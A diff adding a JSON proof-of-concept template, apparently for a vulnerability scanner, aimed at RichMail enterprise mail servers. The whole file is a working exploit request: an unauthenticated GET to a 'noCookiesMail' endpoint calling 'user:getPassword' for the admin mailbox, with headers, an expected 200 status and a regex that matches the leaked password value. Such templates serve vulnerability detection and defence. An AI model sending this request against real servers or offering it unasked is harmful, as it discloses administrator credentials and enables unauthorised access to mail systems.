@@ -1,0 +1,1 @@
+{	"name":"RichMail企业邮箱敏感信息泄漏",	"tag":"Richmail",	"type":"other",	"poc":{		"pocGet":"/RmWeb/noCookiesMail?func=user:getPassword&userMailName=admin",		"header":{			"User-Agent":" Mozilla/5.0",			"Connection":" close",			"Accept-Encoding":" */*",			"Content-Length":" 29"		},    "status_code":"200",		"pattern":"(\\\"result\\\":0,\\\"errorMsg\\\":\\\"[0-9a-z]*\\\")"	}}
